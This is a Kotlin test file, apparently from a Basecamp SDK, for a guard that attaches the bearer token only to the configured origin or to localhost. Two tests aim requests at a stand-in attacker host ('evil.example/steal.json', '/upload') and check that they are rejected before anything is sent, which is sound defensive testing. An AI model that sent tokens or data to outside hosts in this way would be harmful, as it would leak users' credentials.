package com.basecamp.sdk

import io.ktor.client.engine.mock.*
import io.ktor.http.*
import kotlinx.coroutines.test.runTest
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFailsWith
import kotlin.test.assertFalse
import kotlin.test.assertTrue

/**
 * Verifies the same-origin credential guard: the bearer token is attached only
 * to the configured origin (localhost carve-out for dev/test). A foreign-origin
 * absolute URL must error before any network send, leaving the mock engine
 * untouched (no Authorization egress).
 */
class SameOriginTest {
    private fun clientWith(engine: MockEngine) = testBasecampClient {
        accessToken("secret-token"); baseUrl = "https://3.basecampapi.com"
        this.engine = engine; enableRetry = false
    }

    @Test fun requestRejectsForeignOriginWithoutEgress() = runTest {
        var hit = false
        val client = clientWith(MockEngine { hit = true; respondOk("[]") })
        val account = client.forAccount("12345")
        assertFailsWith<BasecampException.Usage> {
            account.httpClient.requestWithRetry(HttpMethod.Get, "https://evil.example/steal.json")
        }
        assertFalse(hit); client.close()
    }

    @Test fun requestBinaryRejectsForeignOrigin() = runTest {
        var hit = false
        val client = clientWith(MockEngine { hit = true; respondOk("{}") })
        val account = client.forAccount("12345")
        assertFailsWith<BasecampException.Usage> {
            account.httpClient.requestBinaryWithRetry(
                HttpMethod.Post, "https://evil.example/upload", byteArrayOf(1, 2, 3), "application/octet-stream")
        }
        assertFalse(hit); client.close()
    }

    @Test fun sameOriginAbsoluteUrlCarriesToken() = runTest {
        var auth: String? = null
        val client = clientWith(MockEngine { req -> auth = req.headers["Authorization"]; respondOk("[]") })
        val account = client.forAccount("12345")
        account.httpClient.requestWithRetry(HttpMethod.Get, "https://3.basecampapi.com/12345/projects.json")
        assertEquals("Bearer secret-token", auth); client.close()
    }

    @Test fun localhostAbsoluteUrlAllowed() = runTest {
        var auth: String? = null
        val client = clientWith(MockEngine { req -> auth = req.headers["Authorization"]; respondOk("[]") })
        val account = client.forAccount("12345")
        account.httpClient.requestWithRetry(HttpMethod.Get, "https://localhost:8080/x.json")
        // Localhost is allowed *and* authenticated — assert the token is present,
        // not merely that a request was sent.
        assertEquals("Bearer secret-token", auth); client.close()
    }

    @Test fun ipv6LoopbackAbsoluteUrlCarriesToken() = runTest {
        var auth: String? = null
        val client = clientWith(MockEngine { req -> auth = req.headers["Authorization"]; respondOk("[]") })
        val account = client.forAccount("12345")
        account.httpClient.requestWithRetry(HttpMethod.Get, "https://[::1]:8080/x.json")
        assertEquals("Bearer secret-token", auth); client.close()
    }
}
